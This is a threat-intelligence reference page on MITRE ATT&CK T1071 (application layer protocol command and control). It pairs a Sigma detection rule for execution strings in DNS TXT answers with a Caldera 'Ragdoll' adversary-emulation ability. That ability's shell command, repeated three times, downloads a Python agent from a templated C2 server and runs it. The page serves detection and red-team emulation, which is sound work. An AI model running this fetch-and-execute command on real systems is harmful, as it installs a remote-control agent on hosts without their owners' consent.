
# Application Layer Protocol

## Description

### MITRE Description

> Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. 

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1071

## Potential Commands

```
{'darwin': {'sh': {'command': 'server="#{app.contact.http}";\ncurl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n', 'cleanup': 'pkill -f ragdoll\n'}}, 'linux': {'sh': {'command': 'server="#{app.contact.http}";\ncurl -s -X POST -H "file:ragdoll.py" -H "platform:linux" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n', 'cleanup': 'pkill -f ragdoll\n'}}}
```

## Commands Dataset

```
[{'command': {'darwin': {'sh': {'cleanup': 'pkill -f ragdoll\n',
                                'command': 'server="#{app.contact.http}";\n'
                                           'curl -s -X POST -H '
                                           '"file:ragdoll.py" -H '
                                           '"platform:darwin" '
                                           '$server/file/download > '
                                           'ragdoll.py;\n'
                                           'pip install requests '
                                           'beautifulsoup4;\n'
                                           'python ragdoll.py -W '
                                           '$server#{app.contact.html}\n'}},
              'linux': {'sh': {'cleanup': 'pkill -f ragdoll\n',
                               'command': 'server="#{app.contact.http}";\n'
                                          'curl -s -X POST -H '
                                          '"file:ragdoll.py" -H '
                                          '"platform:linux" '
                                          '$server/file/download > '
                                          'ragdoll.py;\n'
                                          'pip install requests '
                                          'beautifulsoup4;\n'
                                          'python ragdoll.py -W '
                                          '$server#{app.contact.html}\n'}}},
  'name': 'A Python agent which communicates via the HTML contact',
  'source': 'data/abilities/command-and-control/0ab383be-b819-41bf-91b9-1bd4404d83bf.yml'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Markus Neis',
                  'date': '2018/08/08',
                  'description': 'Detects strings used in command execution in '
                                 'DNS TXT Answer',
                  'detection': {'condition': 'selection',
                                'selection': {'answer': ['*IEX*',
                                                         '*Invoke-Expression*',
                                                         '*cmd.exe*'],
                                              'record_type': 'TXT'}},
                  'falsepositives': ['Unknown'],
                  'id': '8ae51330-899c-4641-8125-e39f2e07da72',
                  'level': 'high',
                  'logsource': {'category': 'dns'},
                  'references': ['https://twitter.com/stvemillertime/status/1024707932447854592',
                                 'https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1'],
                  'status': 'experimental',
                  'tags': ['attack.t1071'],
                  'title': 'DNS TXT Answer with possible execution strings'}},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Network intrusion detection system']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Network intrusion detection system']},
 {'data_source': ['Network protocol analysis']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre Stockpile - A Python agent which communicates via the HTML contact': {'description': 'A '
                                                                                              'Python '
                                                                                              'agent '
                                                                                              'which '
                                                                                              'communicates '
                                                                                              'via '
                                                                                              'the '
                                                                                              'HTML '
                                                                                              'contact',
                                                                               'id': '0ab383be-b819-41bf-91b9-1bd4404d83bf',
                                                                               'name': 'Ragdoll',
                                                                               'platforms': {'darwin': {'sh': {'cleanup': 'pkill '
                                                                                                                          '-f '
                                                                                                                          'ragdoll\n',
                                                                                                               'command': 'server="#{app.contact.http}";\n'
                                                                                                                          'curl '
                                                                                                                          '-s '
                                                                                                                          '-X '
                                                                                                                          'POST '
                                                                                                                          '-H '
                                                                                                                          '"file:ragdoll.py" '
                                                                                                                          '-H '
                                                                                                                          '"platform:darwin" '
                                                                                                                          '$server/file/download '
                                                                                                                          '> '
                                                                                                                          'ragdoll.py;\n'
                                                                                                                          'pip '
                                                                                                                          'install '
                                                                                                                          'requests '
                                                                                                                          'beautifulsoup4;\n'
                                                                                                                          'python '
                                                                                                                          'ragdoll.py '
                                                                                                                          '-W '
                                                                                                                          '$server#{app.contact.html}\n'}},
                                                                                             'linux': {'sh': {'cleanup': 'pkill '
                                                                                                                         '-f '
                                                                                                                         'ragdoll\n',
                                                                                                              'command': 'server="#{app.contact.http}";\n'
                                                                                                                         'curl '
                                                                                                                         '-s '
                                                                                                                         '-X '
                                                                                                                         'POST '
                                                                                                                         '-H '
                                                                                                                         '"file:ragdoll.py" '
                                                                                                                         '-H '
                                                                                                                         '"platform:linux" '
                                                                                                                         '$server/file/download '
                                                                                                                         '> '
                                                                                                                         'ragdoll.py;\n'
                                                                                                                         'pip '
                                                                                                                         'install '
                                                                                                                         'requests '
                                                                                                                         'beautifulsoup4;\n'
                                                                                                                         'python '
                                                                                                                         'ragdoll.py '
                                                                                                                         '-W '
                                                                                                                         '$server#{app.contact.html}\n'}}},
                                                                               'tactic': 'command-and-control',
                                                                               'technique': {'attack_id': 'T1071',
                                                                                             'name': 'Standard '
                                                                                                     'Application '
                                                                                                     'Layer '
                                                                                                     'Protocol'}}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)


# Mitigations


* [Network Intrusion Prevention](../mitigations/Network-Intrusion-Prevention.md)


# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [Magic Hound](../actors/Magic-Hound.md)
    
* [Rocke](../actors/Rocke.md)
    
